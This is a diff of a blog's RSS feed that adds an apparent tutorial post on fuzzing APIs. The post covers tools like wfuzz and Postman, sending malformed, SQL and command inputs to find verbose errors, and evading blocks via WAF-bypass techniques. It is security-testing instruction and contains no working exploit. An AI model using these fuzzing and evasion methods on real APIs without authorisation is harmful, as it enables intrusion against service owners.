@@ -9,10 +9,10 @@
     <lastBuildDate>Fri, 23 Aug 2024 23:17:59 +0100</lastBuildDate><atom:link href="https://flowhero.github.io/newblog/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>CKS</title>
-      <link>https://flowhero.github.io/newblog/docs/cks/</link>
+      <link>https://flowhero.github.io/newblog/posts/cks/</link>
       <pubDate>Fri, 23 Aug 2024 23:17:59 +0100</pubDate>
       
-      <guid>https://flowhero.github.io/newblog/docs/cks/</guid>
+      <guid>https://flowhero.github.io/newblog/posts/cks/</guid>
       <description>[[#Using Network Policies to Restrict Pod-to-Pod Communication|Using Network Policies to Restrict Pod-to-Pod Communication]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Attacker gain initial access to a Pod|Attacker gain initial access to a Pod]] [[#Using Network Policies to Restrict Pod-to-Pod Communication#Denying Directional Network Traffic|Denying Directional Network Traffic]] [[#Run CIS Benchmark to identify security risks for cluster components|Run CIS Benchmark to identify security risks for cluster components]] [[#Creating an Ingress with TLS Termination|Creating an Ingress with TLS Termination]] [[#Creating an Ingress with TLS Termination#Deploy service and pods|Deploy service and pods]] [[#Creating an Ingress with TLS Termination#Create TLS Certificate and Key|Create TLS Certificate and Key]] [[#Creating an Ingress with TLS Termination#Creating the TLS-Typed Secret:|Creating the TLS-Typed Secret:]] [[#Creating an Ingress with TLS Termination#Create Ingress:|Create Ingress:]] [[#Create Ingress:#Securing Internal Communication (Pod-To-Pod):|Securing Internal Communication (Pod-To-Pod):]] [[#Protecting Node Metadata and Endpoints|Protecting Node Metadata and Endpoints]] [[#Protecting GUI Elements|Protecting GUI Elements]] [[#Protecting GUI Elements#Creating a User with Administration Privileges|Creating a User with Administration Privileges]] [[#Protecting GUI Elements#Creating a User with Restricted Privileges|Creating a User with Restricted Privileges]] [[#Protecting GUI Elements#Avoiding Insecure Configuration Arguments|Avoiding Insecure Configuration Arguments]] [[#Verifying Kubernetes Platform Binaries|Verifying Kubernetes Platform Binaries]] [[#Summary|Summary]] - [[#Avoiding Insecure Configuration Arguments#Understand the Purpose and Effects of Network Policies|Understand the Purpose and Effects of Network Policies]] - [[#Avoiding Insecure Configuration Arguments#Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities|Practice the Use of kube-bench to Detect Cluster Component Vulnerabilities]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure Ingress with TLS Termination**|Know How to Configure Ingress with TLS Termination**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Configure GUI Elements for Secure Access**|Know How to Configure GUI Elements for Secure Access**]] - [[#Avoiding Insecure Configuration Arguments#Know How to Detect Modified Platform Binaries|Know How to Detect Modified Platform Binaries]] !</description>
       <content>&lt;ul&gt;
 &lt;li&gt;[[#Using Network Policies to Restrict Pod-to-Pod Communication|Using Network Policies to Restrict Pod-to-Pod Communication]]
@@ -469,6 +469,1051 @@ aws_session_token=IQoJb3JpZ2luX....
 &lt;li&gt;&lt;strong&gt;Hash Files and Validation&lt;/strong&gt;: Know where to find the hash files and how to use validation tools to check if the binaries have been tampered with.&lt;/li&gt;
 &lt;/ul&gt;
 </content>
+    </item>
+    
+    <item>
+      <title>Fuzzing APIs</title>
+      <link>https://flowhero.github.io/newblog/posts/fuzzing-apis/</link>
+      <pubDate>Tue, 22 Aug 2023 00:40:26 +0100</pubDate>
+      
+      <guid>https://flowhero.github.io/newblog/posts/fuzzing-apis/</guid>
+      <description>title = &amp;lsquo;CKS&amp;rsquo; date = 2024-08-23T23:17:59+01:00 draft = false +++
+1 - Toolkits wfuzz Burp Intruder Postman’s Collection Runner 2 - Goal We’ll cover two strategies to increase your success:
+Fuzzing wide and fuzzing deep. How to fuzz for improper assets management vulnerabilities, find the accepted HTTP methods for a request, and bypass input sanitization. 3 - What is API Fuzzing ? API fuzzing is the process of sending requests with various types of input to an endpoint in order to provoke an unintended result.</description>
+      <content>&lt;p&gt;title = &amp;lsquo;CKS&amp;rsquo;
+date = 2024-08-23T23:17:59+01:00
+draft = false
++++&lt;/p&gt;
+&lt;h2 id=&#34;1---toolkits&#34;&gt;1 - Toolkits&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;wfuzz&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Burp Intruder&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Postman’s Collection Runner&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;2---goal&#34;&gt;2 - Goal&lt;/h2&gt;
+&lt;p&gt;We’ll cover two strategies to increase your success:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Fuzzing wide and fuzzing deep.&lt;/li&gt;
+&lt;li&gt;How to fuzz for improper assets management vulnerabilities, find the accepted HTTP methods for a request, and bypass input sanitization.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;3---what-is-api-fuzzing-&#34;&gt;3 - What is API Fuzzing ?&lt;/h2&gt;
+&lt;p&gt;API fuzzing is the process of sending requests with various types of input to an endpoint in order to provoke an unintended result.&lt;/p&gt;
+&lt;p&gt;Here&amp;rsquo;s an example of modifying a key in a JSON data on a POST request , which let the server to reveal a SQL Syntax Error.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/sqlattemptt.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Your input could include&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Symbols,&lt;/li&gt;
+&lt;li&gt;Numbers,&lt;/li&gt;
+&lt;li&gt;Emojis,&lt;/li&gt;
+&lt;li&gt;Decimals,&lt;/li&gt;
+&lt;li&gt;Hexadecimal,&lt;/li&gt;
+&lt;li&gt;System commands,&lt;/li&gt;
+&lt;li&gt;SQL input &amp;hellip;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;For instance. If the API has not implemented validation checks to handle harmful input, you could end up with a verbose error, a unique response, or (in the worst case) some sort of internal server error indicating that your fuzz caused a denial of service, killing the app.&lt;/p&gt;
+&lt;p&gt;Modifying a key in a JSON data on Post request resulted in the server revealing an SQL Syntax Error.&lt;/p&gt;
+&lt;h2 id=&#34;4---effective-fuzzing&#34;&gt;4 - Effective Fuzzing&lt;/h2&gt;
+&lt;p&gt;Lets take a look at this POST request:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;POST /account/balance/transfer
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Host: bank.com
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;x-access-token: hapi_token
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;userid&amp;#34;: 12345,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;account&amp;#34;: 224466,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;transfer-amount&amp;#34;: 1337.25,
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To fuzz this request, you could easily set up Burp Suite or Wfuzz to submit huge payloads as the userid, account, and transfer-amount values. However, this could set off defensive mechanisms, resulting in stronger rate limiting or your token being blocked. If the API lacks these security controls, by all means release the krakens. Otherwise, your best bet is to send a few targeted requests to only one of the values at a time&lt;/p&gt;
+&lt;p&gt;Consider the fact that the transfer-amount value likely expects a relatively small number. Bank.com isn’t anticipating an individual user to transfer an amount larger than the global GDP. It also likely expects a decimal value. Thus, you might want to evaluate what happens when:&lt;/p&gt;
+&lt;p&gt;• Sending an exceptionally large number when a small number is expected&lt;/p&gt;
+&lt;p&gt;• Sending &lt;code&gt;database queries&lt;/code&gt;, &lt;code&gt;system commands&lt;/code&gt;, and other code&lt;/p&gt;
+&lt;p&gt;• Sending a &lt;code&gt;String of letters&lt;/code&gt;  when a number is expected&lt;/p&gt;
+&lt;p&gt;• Sending a &lt;code&gt;large String of letters&lt;/code&gt;  when a small string is expected&lt;/p&gt;
+&lt;p&gt;• Sending various symbols  &lt;code&gt;!@#$%^&amp;amp;*();&#39;:&#39;&#39;|,./?&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;• Sending characters from unexpected languages &lt;code&gt;(漢, さ, Ж, Ѫ, Ѭ, Ѧ, Ѩ, Ѯ)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;• Sending Emojis &lt;code&gt;😀😃😄😁😆&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;These requests could easily lead to verbose errors that reveal more about the application. A value in the quadrillions could additionally cause an unhandled SQL database error to be sent back as a response.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Thus, the success of your fuzzing will depend on where you are fuzzing and what you are fuzzing with, If these inputs do not have sufficient input handling and error handling, they can often lead to exploitation.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;If you are blocked or banned while fuzzing, you might want to deploy evasion techniques discussed in my blog &lt;a href=&#34;https://flowhero.github.io/blogsite/docs/bypassing-wafs/&#34;&gt;https://flowhero.github.io/blogsite/docs/bypassing-wafs/&lt;/a&gt; or else further limit the number of fuzzing requests you send.&lt;/p&gt;
+&lt;h2 id=&#34;5---choosing-fuzzing-payloads&#34;&gt;5 - Choosing Fuzzing Payloads&lt;/h2&gt;
+&lt;p&gt;Different fuzzing payloads can incite various types of responses. You can use either generic fuzzing payloads or more targeted ones&lt;/p&gt;
+&lt;h3 id=&#34;51---generic-payloads&#34;&gt;5.1 - Generic Payloads&lt;/h3&gt;
+&lt;p&gt;Are those we’ve discussed so far and contain symbols, null bytes, directory traversal strings, encoded characters, large numbers, long strings, and so on.&lt;/p&gt;
+&lt;h3 id=&#34;52---targeted-fuzzing-payloads&#34;&gt;5.2 - Targeted Fuzzing Payloads&lt;/h3&gt;
+&lt;p&gt;Are aimed at provoking a response from specific technologies and types of vulnerabilities.&lt;/p&gt;
+&lt;p&gt;Targeted fuzzing payload types might include &lt;strong&gt;API object&lt;/strong&gt; or &lt;strong&gt;variable names&lt;/strong&gt;, &lt;strong&gt;cross-site scripting (XSS)&lt;/strong&gt; payloads, &lt;strong&gt;directories&lt;/strong&gt;, &lt;strong&gt;file extensions&lt;/strong&gt;, &lt;strong&gt;HTTP request methods&lt;/strong&gt;, &lt;strong&gt;JSON&lt;/strong&gt; or &lt;strong&gt;XML data&lt;/strong&gt;, &lt;strong&gt;SQL&lt;/strong&gt; commands, or OS &lt;strong&gt;commands&lt;/strong&gt; .&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Targeted fuzzing payloads are more useful once you know the technologies being used. If you’re sending SQL fuzzing payloads to an API that leverages only NoSQL databases, your testing won’t be as effective.&lt;/p&gt;
+&lt;p&gt;You can use the following sources for fuzzing paylaods:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;SecLists&lt;/code&gt; Payloads &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;SecLists has a whole section dedicated to fuzzing, and its big-list-of-naughty-strings.txt wordlist is excellent at causing useful responses.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Wfuzz&lt;/code&gt; Payloads &lt;a href=&#34;https://github.com/xmendez/wfuzz&#34;&gt;https://github.com/xmendez/wfuzz&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Wfuzz has a great list that combines several targeted payloads in their injection directory, called &lt;a href=&#34;https://raw.githubusercontent.com/xmendez/wfuzz/1b695ee9a87d66a7d7bf6cae70d60a33fae51541/wordlist/Injections/All_attack.txt&#34;&gt;All_attack.txt&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;fuzzdb&lt;/code&gt; Payloads &lt;a href=&#34;https://github.com/fuzzdb-project/fuzzdb&#34;&gt;https://github.com/fuzzdb-project/fuzzdb&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;6---anomaly-detection&#34;&gt;6 - Anomaly Detection&lt;/h2&gt;
+&lt;p&gt;When an API request payload is handled properly, you should receive some sort of HTTP response code and message indicating that your fuzzing did not work. For example, sending a request with a string of letters when numbers are expected could result in a simple response like the following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;400&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Bad Request&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;error&amp;#34;: &amp;#34;number required&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From this response, you can deduce that the developers configured the API to properly handle requests like yours and prepared a tailored response.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;When input is not handled properly and causes an error, the server will often return that error in the response. For example, if you sent input like &lt;code&gt;~&#39;!@#$%^&amp;amp;*()-_+&lt;/code&gt; to an endpoint that improperly handles it, you could receive an error like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;OK&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--snip--&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SQL Error: There is an error in your SQL syntax.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This response immediately reveals that you’re interacting with an API request that does not handle input properly and that the backend of the application is utilizing a SQL database.&lt;/p&gt;
+&lt;h2 id=&#34;7---fuzzing-wide-and-deep&#34;&gt;7 - Fuzzing Wide and Deep&lt;/h2&gt;
+&lt;p&gt;This section will introduce you to two fuzzing techniques: &lt;code&gt;fuzzing wide&lt;/code&gt; and &lt;code&gt;fuzzing deep&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;71---fuzzing-wide&#34;&gt;7.1 - Fuzzing Wide&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Fuzzing wide&lt;/strong&gt; is the act of sending an input across all of an API’s unique requests in an attempt to discover a vulnerability.&lt;/p&gt;
+&lt;p&gt;Is best used to test for issues across all unique requests. Typically, you can fuzz wide to test for improper assets management (more on this later in this blog), finding all valid request methods, token-handling issues, and other information disclosure vulnerabilities.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;72---fuzzing-deep&#34;&gt;7.2 - Fuzzing Deep&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;Fuzzing deep&lt;/strong&gt; is the act of thoroughly testing an individual request with a variety of inputs, replacing headers, parameters, query strings, endpoint paths, and the body of the request with your payloads.&lt;/p&gt;
+&lt;p&gt;Is best used for testing many aspects of individual requests. Most other vulnerability discovery will be done by fuzzing deep. In later chapters, we will use the fuzzing deep technique to discover different types of vulnerabilities, including BOLA, BFLA, injection, and mass assignment.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;73---fuzzing-wide-w-postman&#34;&gt;7.3 - Fuzzing Wide w/ &lt;em&gt;Postman&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;I recommend using Postman to fuzz wide for vulnerabilities across an API, as the tool’s Collection Runner makes it easy to run tests against all API requests. If an API includes 150 unique requests across all the endpoints, you can set a variable to a fuzzing payload entry and test it across all 150 requests. This is particularly easy to do when you’ve built a collection or imported API requests into Postman. For example, you might use this strategy to test whether any of the requests fail to handle various “bad” characters. Send a single payload across the API and check for anomalies.&lt;/p&gt;
+&lt;p&gt;Create a Postman environment in which to save a set of fuzzing variables. This lets you seamlessly use the environmental variables from one collection to the next. Once the fuzzing variables are set as shown below, you can save or update the environment.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_222354.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;At the top right, select the fuzzing environment and then use the variable shortcut {{variable name}} wherever you would like to test a value in a given collection. We can for example replace x-access-token header with the first fuzzing variable.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_225101.png&#34; alt=&#34;image&#34;&gt;
+then start the Postman Collection Runner:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_230418.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;You can also look manually in the collection for some parameters or headers that you want to replace with a fuzzing variable, using &lt;strong&gt;Find and Replace&lt;/strong&gt; feature, found at the bottom left of Postman.&lt;/p&gt;
+&lt;p&gt;Find and Replace lets you search a collection (or all collections) and replace certain terms with a Fuzzing 209 replacement of your choice. If you were attacking the Pixi API, for example, you might notice that many placeholder parameters use tags like &lt;em&gt;email&lt;/em&gt;, &lt;em&gt;number&lt;/em&gt;, &lt;em&gt;string&lt;/em&gt;, and &lt;em&gt;boolean&lt;/em&gt;. This makes it easy to search for these values and replace them with either legitimate ones or one of your fuzzing variables, like &lt;code&gt;{{fuzz1}}&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_231122.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Next, try creating a simple test in the Tests panel to help you detect anomalies.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;let response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; JSON&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;parse&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;responseBody&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;Request passes with success&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; _function_&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;Success&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;expect&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fail&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;Test fails with the following special character&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pm&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;request&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;formdata&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;searchQ&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)+&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt;Errorcode&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;”&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;“&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; response&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;});&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then start the Postman Collection Runner.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_231634.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;74---fuzzing-deep-w-postman&#34;&gt;7.4 - Fuzzing Deep w/ &lt;em&gt;Postman&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;In the Wide Fuzzing, we were using 1 fuzzing variable everywhere (in this case we were testing &lt;code&gt;fuzz1 = ~&#39;!@#$%^&amp;amp;*()-_+&lt;/code&gt; everywhere we find &lt;code&gt;limit&lt;/code&gt; parameter)&lt;/p&gt;
+&lt;h4 id=&#34;scenario-1--fuzzing-endpoints-in-urls&#34;&gt;Scenario 1 : Fuzzing endpoints in URLs&lt;/h4&gt;
+&lt;p&gt;This time, we&amp;rsquo;ll be Fuzzing with the &lt;a href=&#34;https://gist.githubusercontent.com/DannyDainton/b820904694a91e20de1ad900cdeb3a94/raw/9f6dcabfe34506e81ca75ffb092550f709dad043/naughtyStrings.json&#34;&gt;Big List of Naughty Strings&lt;/a&gt; wordlist, we replace the parameters that we want to fuzz with &lt;code&gt;{{naughtyValue}}&lt;/code&gt; that will remain undefined:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_013105.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;until we pass through the data from an external file as shown in the second figure below:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_230256.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_22_232306.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Then we select only the endpoints we want test since we are performing deep fuzzing:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_014009.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;we have &lt;strong&gt;504&lt;/strong&gt; iterations because we have &lt;strong&gt;504&lt;/strong&gt; naughtyValue. After running the test we can see the results live,&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_23_014928.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
